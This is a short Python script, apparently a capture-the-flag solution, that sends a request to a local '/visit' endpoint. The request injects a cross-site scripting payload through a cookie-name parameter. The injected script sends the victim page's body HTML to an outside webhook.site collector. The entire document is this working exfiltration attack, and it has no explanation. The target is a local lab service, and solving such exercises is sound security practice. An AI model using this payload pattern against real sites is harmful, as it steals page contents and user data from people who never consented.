import requests

url = 'http://localhost:5000'

sess = requests.Session()

resp = sess.post(url + '/visit?cookie_name==flag=<script>setTimeout(()=>location.href=`https://webhook.site/0378944e-2533-4d86-bf15-d37956810116?t=${document.body.innerHTML}`,1)</script>')
print(resp.text)
